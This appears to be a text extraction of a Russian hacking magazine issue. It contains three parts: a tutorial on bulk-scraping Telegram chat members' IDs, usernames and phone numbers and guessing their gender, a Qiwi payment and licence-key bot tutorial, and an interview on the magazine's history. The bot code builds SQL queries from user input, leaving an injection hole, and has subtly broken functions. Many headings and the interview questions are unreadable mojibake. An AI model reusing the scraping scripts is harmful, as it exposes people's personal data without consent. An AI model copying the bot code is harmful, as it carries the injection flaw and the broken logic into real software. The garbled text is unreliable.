и выписы вать всю интересу ющую информацию. Способ не очень, так что при-
дет ся посмотреть в сторону род ного API Telegram или, если хочешь упростить
себе жизнь, на какую-нибудь библиотеку, например Telethon .
  В Telethon есть фун кция GetParticipantsRequest , которая получает на вход
некую сущность (entity ), а на выходе выдает список поль зователей.
  Давай попробу ем скормить ей какой-нибудь чат.


async def test1(client):
    chat_id = 'https://t.me/kakoy-to-chat'
    chat_entity =  await client.get_entity(chat_id)
    participants =  await client(GetParticipantsRequest(
        chat_entity, ChannelParticipantsSearch(''), offset=0,
limit=200, hash=0))
    for user in participants.users:
        print(user)
    return

И посмотрим, что можно получить с помощью этой фун кции:


User(id=306742xxx,
    is_self=False,
    contact=False,
    mutual_contact=False,
    deleted=False,
    bot=False,
    bot_chat_history=False,
    bot_nochats=False,
    verified=False,
    restricted=False,
    min=False,
    bot_inline_geo=False,
    support=False,
    scam=False,
    apply_min_photo=True,
    fake=False,
    access_hash=669983103xxxxx,
    first_name='??\u200d>?',
    last_name=None,
    username='prosto_user_name',
    phone=None,
    photo=UserProfilePhoto(photo_id=13174487829112xxxx,
    dc_id=2,
    has_video=False,
    stripped_thumb=b'\x01\x08\x08\x04\xe0\xaa\xe0\x8f\x9b\x8cQE\
x14\x90\xcf'),
    status=UserStatusRecently(),
    bot_info_version=None,
    restriction_reason=[],
    bot_inline_placeholder=None,
    lang_code=None)

Чаще всего требуют ся поля id, username, first_name и last_name, phone.
Кроме того, здесь еще и куча признаков: bot, verified, scam, fake, photo,
status и дру гие.
   Как видишь, информация самая разная. Некоторые специалисты по пар-
сингу Telegram при этом умуд ряют ся заявлять, что им удалось получить толь ко
ID, а юзернеймы с телефонами — за отдель ные день ги. Ловко, ничего не ска-
жешь!
   Телефоны, конечно, в этом списке будут отображать ся толь ко в том слу чае,
если поль зователь в настройках не отключил показ телефона всем.
   Кстати, иног да пред лагают определять еще и пол поль зователя. Таких дан-
ных Telegram не предоставляет и не имеет. Мне известно толь ко два способа
получать эту информацию:
 • анализировать юзернеймы и имена, прогонять их по заранее созданной
   базе и делать, если возможно, какие-то выводы. Если имя поль зователя,
   например, Карина, Юля или Алёна, можно считать его жен щиной;
 • скачивать все сообщения из чата для каждого поль зователя, вытаскивать
   отту да глаголы и смот реть, насколь ко часто они закан чиваются на бук ву «а».
   Логично пред положить, что у жен щин таких слу чаев будет гораздо боль ше,
   чем у мужчин.

Очевид но, что оба способа не дают никаких гаран тий и позволяют определять
пол лишь с некоторой вероятностью и к тому же требуют дополнитель ных уси-
лий.
  Вниматель но      присмотревшись       к      резуль тату      работы
GetParticipantsRequest, мы увидим, что независимо от числа участников
чата и от парамет ра limit нам выдают мак симум 200 поль зователей. Ког да
в группе мень ше 200 участников, этого достаточно, но если их боль ше, то при-
дет ся еще под напрячь ся.
  Мои эксперимен ты с парамет ром offset показали, что он нужен, чтобы
указывать смещение в списке поль зователей. По умолчанию это смещение
равно нулю, но если организовать цикл, на каждой итерации которого увеличи-
вать offset, то будет скачивать ся по 200 юзеров и можно парсить до бес-
конечности (ну или пока не закон чатся все юзеры). Например, так:


 offset = 0
        while True:
            participants = await client(GetParticipantsRequest(
                channel, ChannelParticipantsSearch(''), offset,
limit, hash=0))
            if not participants.users:
                break


            #...
                         # Тут делаем что-то с юзерами из списка
participants.users
            #...


            offset += len(participants.users)

Од нако доволь но быстро выясняет ся, что фун кция GetParticipantsRequest
возвращает мак симум 10 тысяч юзеров. Как увеличить этот лимит, выяснить
пока не удалось. Есть мнение, что это невозможно.
  Параметр filter позволяет задать критерии, которым должны соот ветс-
твовать возвращаемые резуль таты.
   Есть следующие варианты:
 • ChannelParticipantsAdmins;
 • ChannelParticipantsBanned;
 • ChannelParticipantsBots;
 • ChannelParticipantsContacts;
 • ChannelParticipantsKicked;
 • ChannelParticipantsMentions;
 • ChannelParticipantsRecent;
 • ChannelParticipantsSearch.

Тут уже можно эксперимен тировать: попробовать получить список всех адми-
нов, например, или всех, кто онлайн. Парсить поль зователей в онлайне —
вообще хорошая идея. Если делать это регулярно, то можно отсеять неак-
тивных участников, которые добавились в группку и забыли о ней.
   Нас    боль ше     всего    должен     заин тересовать    параметр
ChannelParticipantsSearch, позволяющий искать поль зователей по юзер-
нейму или его части. Давай попробу ем замутить цикл:


    chat_id = 'https://t.me/stepnru'
    chat_entity =  await client.get_entity(chat_id)
    keys = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K',
'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U',
            'V', 'W', 'X', 'Y', 'Z']
    for key in keys:
        offset = 0
        participants = await client(GetParticipantsRequest(
                chat_entity, ChannelParticipantsSearch(key),
offset, limit=200, hash=0))
        print(key + ": " + str(participants.count))


Поясняю: мы взяли весь алфавит и перебрали бук вы, пытаясь найти юзеров,
в user_name которых она есть.
  Смот рим, что получилось:


A: 28068
B: 11188
C: 5721
D: 15950
E: 7522
F: 5280
G: 8812
H: 4002
I: 9233
J: 3642
K: 15177
L: 8264
M: 20343
N: 10546
O: 5903
P: 9001
Q: 1009
R: 9882
S: 22445
T: 9881
U: 2376
V: 12249
W: 2581
X: 1749
Y: 4324
Z: 4283

Как вид но, иног да список резуль татов содержит мень ше 10 тысяч, и тог да мы
можем вытащить его полностью, иног да — боль ше, и тог да мы опять получим
толь ко первые 10 тысяч. Однако тест на группе со 190 тысячами юзеров поз-
волил узнать дан ные о 140 тысячах, а это уже немало!
  Наверняка существу ют и дру гие способы поиг рать с филь трами и вытащить
еще боль ше людей из чата. Пусть это будет тебе домаш ним заданием.
  Обрати внимание: этот способ работает нам ного доль ше, и парсинг группы
с несколь кими десят ками юзеров может занимать до несколь ких десят ков
минут.
   Сохранять резуль таты я рекомен дую не в тек стовый файл, а в какую-нибудь
базу дан ных, например SQLite:


def add_users_in_base(bd_name, users):
    sqlite_connection = sqlite3.connect(bd_name)
    cursor = sqlite_connection.cursor()
    for user in users:
        sqlite_insert_query = "INSERT INTO users (id, deleted,
bot, bot_chat_history .....  phone) VALUES (?,?,?,?,?,?,?,?) "
        data_tuple = (
            user.id, user.deleted, user.bot, user.bot_chat_history
, .... user.phone)
        try:
            cursor.execute(sqlite_insert_query, data_tuple)
        except sqlite3.Error as er:
            pass
        sqlite_connection.commit()
    cursor.close()
    sqlite_connection.close()

Так сразу отсеивают ся дубликаты, и потом будет нам ного удобнее работать
с получен ными дан ными: искать, сортировать, кон вертировать.


ÂÛÂÎÄÛ

Итак, я показал тебе, как извлекать из чата информацию о 10 тысячах его учас-
тников, а с применением филь тров — гораздо боль ше. Нем ного поэк спе-
римен тировав, ты сможешь написать скрипты, которые соберут нужную тебе
информацию в удобном виде.
   Если вдруг знаешь еще какие-то интересные трюки по этой теме, не забудь
поделить ся в ком ментариях!
КОДИНГ





      АВТОМАТИЗИРУЕМ ПРИЕМ
      ПЛАТЕЖЕЙ QIWI НА PYTHON



Как говорил великий ком бинатор, «О кар-
манных деньгах не надо думать — они
валя ются на дороге, и мы будем их под-
бирать по мере надобности». В сов ремен-
ном мире, где авто мати зация лег ка и пов-             Mazay                                                                                          stariy2003@yandex.ru
семестна,  кешем  обза водиться можно
даже не нагиба ясь. Достаточ но сделать
полез ную прог рамму или сер вис и под-
клю чить пла тежи. Сегод ня мы погово рим
имен но о пла тежах и смастерим собствен-
ный скрипт для при ема опла ты на кошелек
Qiwi.


Этот сервис я выбрал как один из самых распространен ных, удобных и не тре-
бующих сложных действий вроде регистрации ИП или зак лючения договоров.
Зачем нам эта бюрок ратия? Нам работать надо!
  Писать будем на Python, хотя, вниматель но изу чив примеры, ты сможешь
при желании воспроизвести их на дру гом язы ке.


ÏÎÑÒÀÍÎÂÊÀ ÇÀÄÀ×È

Итак, дано: есть прог рамма, единствен ная фун кция которой — выводить
на экран тек стовое сообщение. Если прог рамма работает в деморежиме, то
сообщение будет «Дем ка», если в полноцен ном, то «Прог рамма зарегистри-
рована». Дем ка бесплат на, полная версия будет стоить рубль (дороже такое
вряд ли кто-то купит).
   Требует ся: прик рутить к нашей прог рамме возможность плат но перек-
лючать ся из деморежима в полноцен ный, при этом желатель но вообще
без нашего участия.
   Вот наша прог рамма:



def get_ID():
    # Тут надо вставить генерацию уникального ключа,
    # но для иллюстрации сойдет и просто константа,
    # задаваемая вручную для каждого экземпляра ПО
    return 1



def get_key_from_file(file_name):
    try:
        key_file = open(file_name, "r")
        key = key_file.read()
        return key
    except:
        return 0



def check_key():
    key = int(get_key_from_file('key.txt'))
    # Такой вот простой алгоритм генерации ключа
    # В реальной программе следует придумать посложнее
    if key == get_ID() * 2:
        return True
    else:
        return False



if check_key():
    print('Программа зарегистрирована!')
else:
    print('Демка!')

Алгоритм работы такой:
 • Прог рамма при запуске создает ID поль зователя. Можно,  к примеру,
   генерировать  иден тификатор  на  основе  серийников  установленного
   железа, а если ты решил делать бота для Telegram, то достаточно взять
  user_id.
 • Прог рамма проверяет файл лицен зии, где надеется увидеть сгенерирован-
  ный на основе своего ID набор дан ных (назовем его ключом), из которого
   будет понят но, оплатил ли поль зователь покупку.
 • Если ключ под ходит, то выводим сообщение об этом.
 • Если ключ неправиль ный, прог рамма выводит сообщение «Дем ка».

Нам нужно реализовать возможность получения ключа в автоматическом
режиме, то есть без участия создателя прог раммы. Ключ должен выдавать ся
каждому свой, в зависимости от ID, и толь ко тем, кто нам заплатил.
   Взаимодействовать с поль зователем мы будем через Telegram, посколь ку
это просто, удобно и современ но. При желании в качестве фрон тенда можно
исполь зовать и сайт, а ключ высылать по элек трон ной почте, но это совсем
дру гая история.




Я в этой статье исполь зую очень примитивный вариант защиты. Даже если мы
изобретем сложный способ генерации ID, для взлом щика все в итоге сводит ся
к тому, чтобы исправить резуль тат сравнения ключа с эталон ным. Чтобы
усложнить ему жизнь, ты можешь исполь зовать дополнитель ные защиты
и методы обфускации.
  Од нако гораздо более простой способ защитить прог рамму — это сделать
ее сервисом. И если никакой сложный графический интерфейс не нужен, тог да
отличный вариант — это бот в Telegram. В таком слу чае можно не замора-
чивать ся с ключами и достаточно лишь проверять в базе факт оплаты.
   Итак, недостатки бота:
 • нель зя реализовать сложный интерфейс;
 • нель зя работать с локаль ным оборудованием;
 • сложно обрабаты вать много файлов;
 • необходимо постоян ное под ключение к интернету.

Достоинства бота:
 • не надо беспокоить ся о всякого рода зависимостях, совместимостях, вер-
   сиях операционки и так далее — все будет работать под твоим неусыпным
   кон тролем;
 • ник то не будет иметь доступа к коду, и ник то не сможет даже попытать ся
   его взломать.



Пред полагается, что поль зователь прог раммы будет оплачивать необходимую
сум му на кошелек Qiwi, введя в ком ментариях ID.
  Серверная же часть будет состоять из двух модулей: чекера и бота. Чекер
станет с неболь шим интервалом проверять кошелек и при получении платежей
складывать информацию о них в базу, присовокупляя к ним айдиш ники поль-
зователей и свежесгенерирован ные ключики. А бот получит от поль зователя ID
и проверит, есть ли он в базе оплачен ных. Если есть, то выш лет в ответ ключик,
который поль зователю надо будет сохранить в каталог с прог раммой.
   Разработ чику в таком слу чае остается толь ко периодически проверять
баланс кошель ка да листать  каталог  элит ной нед вижимости, почесы вая
при этом пузо и сыто икая.


ÐÅÀËÈÇÀÖÈß

Ëîêàëüíàÿ ÷àñòü
Итак, для начала идем на сайт Qiwi и создаем там пару ключей для доступа
через API.





Ключи необходимо сохранить в надежном месте.
   Ког да мы будем отправлять поль зователя на оплату, мы пред ложим ему
перейти по ссылке такого вида:


https://oplata.qiwi.com/create?publicKey=<qiwi_public_key>&
billId=<unical_paid_id>&amount=<price>&comment=<ID>&successUrl=<
bot_url>

Здесь нужно под ставить следующие парамет ры:
 • publicKey — публичный ключ для доступа к API Qiwi;
 • billId — уникаль ный иден тификатор счета, который нам необходимо
   генерировать самостоятель но. Думаю, можно обойтись нашим ID, к которо-
  му следует прибавить текущие дату и время, а для красоты — посчитать
  хеш от этой строки;
 • amount — размер платежа в рублях, в нашем слу чае будет 1;
 • comment — в ком ментарии следует положить ID, по которому чекер сможет
   понять, от кого пришел платеж и для какого ID ему следует создавать клю-
   чик;
 • successUrl — адрес, на который отправят поль зователя после оплаты.
  Сюда мы вставим адрес бота, выдающего ключ. Конечно, на всякий слу чай
   следует продублировать ссылку на бота в интерфейсе прог раммы и в инс-
   трук ции, мало ли что.

Добавляем в прог рамму фун кцию, генерирующую URL:


def get_url():
    url = 'https://oplata.qiwi.com/create?publicKey='+config.
qiwi_public_key+ \
          '&billId='+get_unical_billID()+'&amount=1&comment='+str(
get_ID())+'&successUrl="https://t.me/super_qiwi_xakep_bot?start="'
+str(get_ID())
    return""

И изменяем проверку ключа. Добавим в нее откры тие нашей ссылки в браузе-
ре по умолчанию:


if check_key():
    print('Программа зарегистрирована!')
else:
    print('Демка!')
    subprocess.Popen(('start', get_url()), shell=True)

В итоге поль зователь будет отправлен на сайт Qiwi, где ему останет ся залоги-
нить ся и нажать кнопку «Перевести».





ÑÅÐÂÅÐÍÀß ×ÀÑÒÜ

На сервере нам понадобят ся две прог раммы. Первая — чекер, он будет
регулярно проверять, поступили ли в кошелек свежие платежи, и сохранять их
в базу дан ных. Вторая — бот, который должен взаимодействовать с поль-
зователем и при наличии платежа в базе выдавать поль зователю ключ взамен
на ID.


×åêåð
Для проверки списка последних платежей нам необходимо вы пустить токен
для API.
   Этот токен нужно передавать в заголовке каждого запроса. Запускать чекер
удобнее всего через cron. Итак, поехали:


#!/usr/bin/python3
import json
import sqlite3
import requests
import config



def keygen(ID):
    return ID * 2



sqlite_connection = sqlite3.Connection
try:
    # Подключаемся к базе
    sqlite_connection = sqlite3.connect(config.db_name)
    cursor = sqlite_connection.cursor()
    # Создаем таблицу, если она отсутствует
    sqlite_create_table_query = '''CREATE TABLE if not exists
qiwi (
                                    txnId INTEGER PRIMARY KEY,
                                    account TEXT ,
                                    summa text,
                                    date datetime,
                                    program_id text,
                                     key text);'''
    cursor.execute(sqlite_create_table_query)
    sqlite_connection.commit()


    s = requests.Session()
    # Создаем заголовок с токеном
    s.headers['authorization'] = 'Bearer ' + config.
qiwi_api_access_token
    parameters = {'rows': '50'}
    # Запрашиваем список последних 50 платежей (если запускать
чекер каждые 10 секунд, этого будет вполне достаточно на первых
порах)
    h = s.get('https://edge.qiwi.com/payment-history/v1/persons/'
+ config.qiwi_login + '/payments', params=parameters)
    res = json.loads(h.text)
    sqlite_insert_query = "INSERT INTO qiwi (date,txnId, account,
summa, program_id, key) VALUES (?,?,?,?,?,?) "
    # Пробегаемся по полученному списку
    for data in res['data']:
        if data['type'] == 'IN':
             # Генерируем ключ, взяв ID пользователя из
комментария к платежу
            key = keygen(data['comment'])
            data_tuple = (data['date'], data['txnId'], str(data[
'account']), str(data['sum']['amount']),
                          data['comment'], key)
            try:
                 # И добавляем результат в базу. Если платеж уже
добавлен, то ничего страшного не произойдет, словим exeption и
продолжим работать дальше
                cursor.execute(sqlite_insert_query, data_tuple)
            except:
                print("Ошибка добавления ")
            sqlite_connection.commit()
    cursor.close()


except sqlite3.Error as error:
    print("Ошибка при подключении к sqlite" + str(error))
finally:
    if sqlite_connection:
        sqlite_connection.close()

Конечно, в реаль ный чекер следует добавить как минимум логирование оши-
бок и дополнитель ные проверки, но для понимания сути процесса это сейчас
не важно.
  Осталось сделать бота. Инструк ций, как создать бота через BotFather,
в интернете неисчислимое множество, поэтому перейду сразу к делу.


#!/usr/bin/python3


import telebot
import config
import sqlite3


# Создаем экземпляр бота
bot = telebot.TeleBot(config.tg_bot_token)


# Функция, обрабатывающая команду /start
@bot.message_handler(commands=["start"])
def start(message):
    # При успешной оплате мы пересылаем пользователя на нашего
бота, сразу передав в качестве параметра команды start ключ
пользователя. Мы можем сразу обработать эту ситуацию и вернуть
ключ. Если же пользователь сам пришел к боту, то надо пояснить
ему, что нужно сделать
    if message.text == '/start':
        bot.send_message(message.chat.id,
                         'Привет! Пришли мне ID своей программы,
и, если она оплачена, я пришлю тебе в ответ ключик.')
    else:
        if len(message.text) > 1 + len('/start'):
            handle_text(message)



@bot.message_handler(content_types=["text"])
def handle_text(message):
    sqlite_connection = sqlite3.Connection
    try:
        sqlite_connection = sqlite3.connect(config.db_name)
        # Если это первый запуск, то отрезаем все лишнее, если не
первый, то считаем, что нам передали ключ и ищем его в базе.
По-хорошему, конечно, тут не помешает сделать какие-то
дополнительные проверки, так что воспринимай это как макет
программы
        if str(message.text).startswith('/start'):
            text = str(message.text)[len('/start') + 1:len(message
.text)]
        else:
            text = message.text
        sqlite_select_query = "SELECT * from qiwi where
program_id ='" + text + "';"
        cursor = sqlite_connection.cursor()
        cursor.execute(sqlite_select_query)
        rows = cursor.fetchall()
        cursor.close()
        key = ""
        for row in rows:
            key = row[5]
        # Берем последний ключ из базы и отправляем его
пользователю
        if len(key) > 0:
            bot.send_message(message.chat.id, 'Твой ключ: ' + key
+ '\nСохрани его в файл key.txt и положи рядом с программой.')
        else:
            bot.send_message(message.chat.id,
                             'Твоего ID нет в списке оплаченных.
Возможно, платеж еще не обработан. Обычно это занимает не более
минуты, попробуй еще раз через 5 минут, если не поможет —
обращайся к разработчику, будем разбираться.')
    except sqlite3.Error as error:
        print(error)
    finally:
        if sqlite_connection:
            sqlite_connection.close()


# Запускаем бота
bot.polling(none_stop=True, interval=0)


ÂÛÂÎÄÛ

Наша импровизирован ная инфраструк тура готова к работе. Поль зователь
может переходить по ссылке и оплачивать посиль ный взнос, чекер обнаружит
платеж и внесет его в базу, заод но сгенерировав ключик, а бот выдаст ключ
поль зователю при наличии оплаты. День ги падают в наш кошелек, мы богате-
ем.
  Напоследок расскажу тебе о разновид ности мошен ничества, с которой я
столкнулся при тестировании. В интернете продают ся готовые аккаунты Qiwi,
в том числе и прошед шие иден тификацию и привязку к паспортным дан ным.
Такие аккаунты часто покупают, чтобы не светить свои реаль ные дан ные.
  Бы вают слу чаи, ког да мошен ники продают аккаунты Qiwi по заведомо низ-
ким ценам, например по 5–10 рублей вместо 30 или 60. А после покупки лег ко
может оказать ся, что к такому аккаунту уже выпущен токен, с помощью которо-
го можно проверять баланс, а самое главное — переводить день ги. У мошен-
ников есть чекер, который постоян но проверяет продан ный тебе кошелек
и при появлении денег на балан се мгновен но переводит всю сум му или ее
часть на свой кошелек. Будь осторожен и не гонись за бесплат ным сыром!
GEEK





      О ТОМ, КАК СОЗДАВАЛСЯ
                «ХАКЕР»



Сегод ня мы нем ного отвлечем ся от уяз-
вимостей и их эксплу ата ции, что бы пре-
даться ностальгии и вспом нить об исто ках
«Хакера». Дмит рий Ага рунов осно вал сеть
магази нов Gameland, а затем и одно имен-       Андрей Письменный                                                                                      Главный редактор
ное   изда тельство,   где   выпускались         apismenny@gmail.com
«Хакер», «Стра на игр» и мно гие дру гие
жур налы. Мы сели и обсу дили исто рию
и кон цепцию «Хакера», порассмат ривали
ста рые фото и вспом нили людей, которые
работа ли над жур налом в раз ное время.


ÄÎ «ÕÀÊÅÐÀ»

— Äàâàé íà÷íåì ñ ñàìîãî íà÷àëà. Êàê ïîÿâèëàñü «Ñòðàíà èãð»?
Îòêóäà âçÿëàñü ïåðâàÿ ðåäàêöèÿ? ß ÷èòàë, ÷òî âû âçÿëè ÷åëîâåêà,
êîòîðûé ïåðåâîäèë ðóêîâîäñòâà ê èãðàì, ïðîäàâàâøèìñÿ â òâîåé
òîðãîâîé ñåòè. Ýòî òàê?
— Если корот ко, это была идея сот рудника Gameland — Димы Дон ского. Он
был сту ден том и действитель но переводил руководства к играм. И пред ложил:
«Дима, давай сделаем журнал!» Он был талан тливым парнем и как раз тог да
проходил прак тику и учился год в школе в США. Так что во многом журнал —
это под смот ренная на Западе идея. Я долго не хотел этим занимать ся, но ког-
да Дима пообещал взять на себя всю ответствен ность по запуску, то сог ласил-
ся. И мы выпустили журнал: в 1995 году начали работу и сделали первый
номер, в январе 96-го получили тираж. Главной целью журнала тог да было
рассказывать о кру тых видеоиг рах и прод вигать наши магазины. В тот момент
в России из крупных журналов уже выходил «Магазин игру шек» (будущий
Game.EXE), но рек лама там стоила очень дорого, 5000 долларов за страницу,
к тому же он мне казался слиш ком пафосным и малопонят ным.





        Дмит рий Агарунов на презен тации Nintendo 64, 1996 год


— È äåëî ñðàçó ïîøëî?
— Первый тираж был 5 тысяч, потом 10, потом 18, в первый год журнал
не оку пался. Прибыль ным он стал толь ко через год,  ког да тираж дос-
тиг 60 тысяч.


— Ïðîäàâàëè ó ñåáÿ?
— Нет, распространителем стала ком пания «Глобус», у них были точки в мет ро,
и они забирали все первые тиражи. Это был их эксклюзив.


— Êàê âûãëÿäåëà êîìàíäà «Ñòðàíû Èãð»?
— Ее собрал Дима Дон ской, первый номер они делали с Сергеем Лян ге и еще
парой ребят. Сергей — боль шой энту зиаст игр и имел полиг рафическое обра-
зование, занимался версткой. Коман да тог да располагалась прямо в магазине,
мог ла сразу брать игры и играть в них.





              Магазин Gameland на Новом Арбате


— «Õàêåð» áûë âàøèì âòîðûì æóðíàëîì?
— Мы параллель но запускали русскую версию Oﬃcial PlayStation Magazine, так
что вторым был скорее он, а «Хакер» — треть им.


— Êàêàÿ áûëà ìîòèâàöèÿ îòêðûâàòü åùå æóðíàëû?
— Я тог да разочаровался в торговле — из-за пиратства. До 1998 года мне
удавалось вык ручивать ся за счет выхода новых приставок и дорогих игр к ним.
А потом вдруг стало возможно пиратить вообще всё. Мы же были ориенти-
рованы на фанатов и торговали лицен зией. Летом 1998 года мы перевели
магазин в интернет, чтобы распродать остатки товара.


— Â 1998 ãîäó å-êîììåðñ áûë äîâîëüíî ïðîãðåññèâíîé èäååé!
— Мы тог да не считали это чем-то необычным. С 1996 года у нас уже был сайт
Gameland.ru, да и у «Хакера» сайт появился с момен та откры тия. Сейчас-то я
уже понимаю, что стоявший прямо в офисе сервер с этими сайтами — не сов-
сем обычная ситу ация. А тог да было нормаль но.


— Ïîñëå çàêðûòèÿ ñåòè âû ñîñðåäîòî÷èëèñü íà èçäàíèè
æóðíàëîâ?
— Да, я решил, что издатель ство перспек тивнее. Тираж «Страны игр» достиг
уже 80 тысяч, это был хороший доход — тысяч 25–30 долларов в месяц. Я
подумал, что 10–20 таких журналь чиков и получит ся уже тысяч 300.


ÏÅÐÂÛÉ ÍÎÌÅÐ

— Êàê è êîìó ïðèøëà â ãîëîâó èäåÿ çàïóñòèòü «Õàêåð»? Êòî ïåðâûé
ñêàçàë ñàìî ñëîâî?
— Игорь Пискунов работал у меня в магазине, он был братом одного из моих
менед жеров. Тог да Игорь в числе прочего начал занимать ся рек ламой. Очень
куражный был парень! Он пред ложил сделать «Хакер», имея в виду веселый
компь ютерный журнал. Про взлом мы в тот момент слы шали, но не более того.
Поэтому решили сделать половину журнала про компь ютерные игры и позвали
для этого Дениса Давыдова.





                          Игорь Пискунов


— Çíàþ Äýíà! Îí âåäü ïîòîì îñíîâàë «Íàâèãàòîð èãðîâîãî ìèðà»
è îäíî âðåìÿ áûë ãëàâðåäîì «Èãðîìàíèè»?
— Да, он в какой-то момент вдохнул в нее новую жизнь.


— Â êàêîì ãîäó íà÷àëè ðàáîòàòü íàä «Õàêåðîì»?
— Мы решили сделать «Хакер» в августе 1998 года, но из-за кризиса перенес-
ли откры тие. Первый выпуск вышел в феврале 99-го.


— Äàâûäîâ âî âðåìåíà çàïóñêà «Õàêåðà» ðàáîòàë â «Ñòðàíå Èãð»?
— Нет, он был не из «Геймлен да». Он тог да с группой людей делал журнал
«Игрополис» — еще более пафосный, чем Game.EXE. Роскошный и гламур-
ный. Этот журнал так и не вышел. Мы тог да приг ласили Дениса в «Хакер» вести
рубрику о компь ютерных играх.


— Êàê â «Õàêåð» ïðèøåë ëåãåíäàðíûé ãëàâðåä Ñåðãåé Ïîêðîâñêèé
(SINtez)?
— Его нашел Игорь Пискунов. «Хакер» был его идеей, ему я и поручил запуск
журнала.


— Â ïåðâîì íîìåðå ãëàâíûé ðåäàêòîð äàæå íå áûë óêàçàí, âåðíî?
— Да, я не хотел тог да давать должности. Молодежь часто стремит ся занять
должность, а я не хотел, чтобы ее занял какой-то человек, который не может
быть редак тором и тем более главредом и толь ко стремит ся поскорее попасть
на первую строчку тит ров. Я этого делать не давал — сначала нужно было
доказать, что ты справляешь ся.


— Êàê ñêîðî ñòàëî î÷åâèäíî, ÷òî Ïîêðîâñêèé äîñòîèí?
— Очень быстро. Он был очень энергичный, быстро собрал коман ду. Боль шой
энту зиаст хакерской куль туры.





                      Сергей Пок ровский


— Åãî âèäåíèå íå øëî âðàçðåç ñ âàøèìè ïëàíàìè äåëàòü
ïîëîâèíó æóðíàëà ïðî èãðû?
— Для меня это было нейтраль ным фак тором. Мне казалось, что раз журнал
для энту зиастов ПК, а половина этого энту зиазма держится на играх, то о них
стоит писать, это гаран тиру ет дополнитель ный спрос. Но мы быстро поняли,
что и по компь ютерной тематике полно материала, а наличие раздела игр раз-
дражает фанатов хакин га.


ÏÐÎÒÅÑÒ

— Êàê «Õàêåð» ñòàë òàêèì êîíòðêóëüòóðíûì, êàêèì îí áûë
âíà÷àëå? Òàê áûëî ñðàçó çàäóìàíî?
— В 1998 году Запад нас жестоко кинул. Я за три дня превратился из богатого
человека в должника, потеряв 3 миллиона долларов — из-за изменения курса
валюты. У меня был дикий над лом, обида и протест. Хотелось дать какой-то
ответ. В России тог да не было кру тых современ ных производств, своих
товаров и брен дов (или, по крайней мере, так казалось), и единствен ное, что
мы мог ли противопоставить, — это наши мозги. Посколь ку в России есть кру-
тые прог раммисты и математики, я добавил журналу протестную миссию. Мы
против любого официоза, абстрак тных красивых слов, против Запада, против
правитель ства. И мы вооду шевляем российских пацанов, в том числе из глу-
бин ки, стать прог раммистами и превратить Россию в айтиш ную державу —
без всякой связи с властями. Для меня эта партизан ская идеология была очень
важна.


— Èç ýòîé æå èäåè ðîäèëñÿ è «êèñëîòíûé» äèçàéí æóðíàëà?
— Да, задачу дизайнеру, Руслану Рубан скому, имен но так и поставили — сде-
лать пожестче, чтобы читался протест. Киберпанковский стиль журнал обрел
уже где-то через год.





                         «Хакер» #9 за 1999 год


— Êàêàÿ áûëà ïåðâàÿ ðåàêöèÿ ïóáëèêè íà «Õàêåð»?
— Реак ция была момен таль ной. Сразу же начались звон ки от крупных компь-
ютерных ком паний, которые грозили отправить нас за решет ку. Я пом ню, хозя-
ин одной крупной компь ютерной сети звонил мне и кричал: «Ты хочешь, чтобы
изнасиловали твою пят надцатилет нюю дочь?!», имея в виду, что мы тут тоже
занимаемся криминалом — учим людей взламывать и вооду шевляем на это.
Мне звонили сот рудники органов, на меня заводили дела, вызывали на доп-
росы. Но при этом был и восторг со стороны читателей!


— Âû íè÷åãî òàêîãî íå îæèäàëè?
— Я этого хотел! Это работало на нашу известность и под тверждало, что про-
тест настоящий, искрен ний. Я в бизнесе с девяностых, и допросами меня было
не испу гать. Да и суд не означал, что нас зак роют. Мы выиг рывали эти суды
и продолжали работать.


— Ýòî íà÷àëîñü ñ ïåðâîãî æå íîìåðà? Òîãî ñàìîãî, ãäå áûëè
ñïëîøíûå èãðû è ÷èò-êîäû ê íèì?
— Имен но. И я тог да решил, что хочу поболь ше жести и хардкора. Пускай зво-
нят, пускай судят ся! Нам от этого толь ко лучше.


— Êàê ïðîäàâàëñÿ ïåðâûé íîìåð «Õàêåðà»?
— Это не было ни великим провалом, ни каким-то огромным достижением.
Мы сразу выш ли в прибыль, но неболь шую.


                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИGEEK




               О ТОМ, КАК СОЗДАВАЛСЯ «ХАКЕР»





ËÅÃÅÍÄÛ

— Ðàññêàæè ïîäðîáíåå ïðî Ïîêðîâñêîãî.
— С виду Сергей был худень кий, акку рат нень кий парень. Обладал огромной
энергией. Я считаю, что он входил если не в топ-100, то в топ-1000 важнейших
для страны людей. Как еще недавно Юрий Дудь.


— Â 2002 ãîäó Ñèíòåç ïåðåñòàë áûòü ãëàâðåäîì «Õàêåðà», ïîëó÷èë
ïîâûøåíèå è ñòàë èçäàòåëåì. Êàê ýòî áûëî?
— Мне казалось, что все люди должны расти, делать бизнес. Я пред ложил
Сергею: «Давай издавать дру гие журналы на тему компь ютеров и IT». Меш-
ками приходили пись ма, часть из них я читал. Кто-то из под писчиков хотел лег-
кого чтива, но некоторые — чего-то посерь езнее. Казалось, есть разные пот-
ребности и для каждой группы можно сделать отдель ное издание. Для сугубо
айтиш ников мы тог да сделали «Хакер Спец».


— Êîãî åùå ìîæåøü âñïîìíèòü èç òîãäàøíèõ ñîòðóäíèêîâ? Ó âàñ
æå áûëè ÿðêèå ëè÷íîñòè. Ê ïðèìåðó, èçâåñòíûé íûíå Äìèòðèé
Ïó÷êîâ íà÷èíàë â «Õàêåðå».
— В то время я уже не вникал в дела редак ции, и все это шло нем ного парал-
лель но. Всего я запустил поряд ка 80 журналов, и детали стерлись из памяти.
С Пучковым пом ню, что встречался и разговаривал, — он был взрослым серь-
езным дядь кой в отличие от многих сот рудников. Шеповалова тоже пом ню
по корпоративным вечерин кам, восхищался его творчеством, но привел его
не я. Я тог да толь ко следил за общей кон цепцией.





          Офис Gameland на улице Льва Толстого, 2004 год


— Ïî îùóùåíèÿì ðåäàêöèÿ «Õàêåðà» ñèëüíî îòëè÷àëàñü îò
ðåäàêöèè «Ñòðàíû èãð»?
— Конечно! В «Хакере» был совершенно уникаль ный движняк, ни с чем невоз-
можно сравнивать. А в «Стране игр» были куда более мяг кие ребята, я бы даже
сказал, нежные.


— ß âû÷èòàë â ëåòîïèñÿõ, ÷òî ðåäàêöèÿ ìåíÿëà ÷èòàòåëÿì
ðåäàêöèîííûå ýêçåìïëÿðû æóðíàëîâ íà ïèâî. Òû ïðî ýòî ñëûøàë?
— Про такое я не слы шал. Но журналов приезжал целый гру зовик, редак ции
